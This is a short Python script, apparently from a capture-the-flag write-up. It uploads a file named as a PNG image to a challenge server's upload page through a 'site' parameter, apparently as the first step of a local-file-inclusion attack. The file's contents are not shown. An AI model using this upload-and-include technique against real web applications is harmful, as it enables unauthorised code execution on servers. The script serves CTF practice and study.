import requests
r=requests.post('http://lfi.hax1.allesctf.net:8081/index.php?site=upload.php', files={'file': ('asd.png',open('asd.png', 'rb').read(), 'image/png')})
print(r.text)